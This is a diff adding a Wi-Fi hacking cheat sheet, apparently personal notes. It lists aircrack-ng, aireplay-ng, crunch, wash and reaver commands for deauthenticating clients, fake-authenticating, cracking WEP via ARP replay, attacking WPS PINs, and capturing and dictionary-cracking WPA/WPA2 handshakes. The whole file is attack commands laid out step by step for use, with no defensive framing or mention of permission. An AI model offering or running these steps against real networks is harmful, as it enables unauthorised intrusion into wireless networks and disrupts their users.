@@ -1,0 +1,41 @@
+///PRE-CONNECTION///
+Changing Adapter Modes:
+- airmon-ng start (Adapter) [Puts adapter into Monitor]
+- airmon-ng stop (Adapter) [Puts adapter into Managed]
+
+Search for Networks:
+- airodump-ng (Adapter in Mon mode)
+
+Search for MACs on a Certain Network:
+- airodump-ng --bssid (MAC of router) --channel (Channel) (Adapter in Mon mode)
+
+Capture Packets:
+- airodump-ng --bssid (MAC of router) --channel (Channel) --write (FileName) (Adapter in Mon mode)
+
+DeAuth//FakeAuth Attack:
+- aireplay-ng --deauth (number of packets) -a (bssid of router) -c (bssid of client) (Adapter in Mon mode)
+- aireplay-ng --fakeauth (How long to wait before next auth. Ex. 30) -a (MAC of router) -h (MAC of WiFi adapter) (Adapter in Mon mode)
+
+WEP Hacking // If not enough data is being sent, use ARP Replay Attack:
+- Capture Packets
+- aircrack-ng (.cap file from above)
+
+ARP Replay Attack; Forces AP to generate lots of IVs:
+- FakeAuth attack
+- aireplay-ng --arpreplay -b (MAC of router) -h (MAC of WiFi adapter) (Adapter in Mon mode)
+
+Creating a Wordlist:
+- crunch (Min) (Max) (characters) -o (FileName) -t (Pattern)
+
+---WPA/WPA2 Hacking---
+Check if WPS is Enabled for WPA/WPA2 Networks:
+- wash --interface (Adapter in Mon mode)
+WPS 1.0 Attack (Mustn't Use Push Button Auth):
+- reaver --bssid (MAC of router) --channel (Channel) --interface (Adapter in Mon mode) -vvv (Displays all info)  --no-associate (Use if doing a fake auth at the same time)
+- Use Fake Auth
+Capturing Handshake:
+- Write captured packets to a file from a certain network; wait until handshake gets captured or use a DeAuth to force connection
+- aircrack-ng (.cap file with handshake) -w (wordlist)
+---END---
+
+ 
